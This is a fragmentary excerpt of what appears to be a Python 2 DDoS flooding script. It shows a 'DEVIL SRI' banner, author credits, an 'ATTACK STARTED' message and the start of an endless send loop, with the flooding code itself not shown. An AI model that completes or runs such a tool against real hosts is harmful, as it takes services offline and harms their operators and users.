...
os.system("clear")
os.system("figlet DEVIL SRI")
print
print "Coded By : SRI KARAN"
print "Author   : SRIKARAN"
print "Github   : github.com/srikaran5"
...
time.sleep(5)
print "    DDOS ATTACK STARTED. NOTE: YOU ARE LOOSER "
time.sleep(3)
sent = 0
while True:
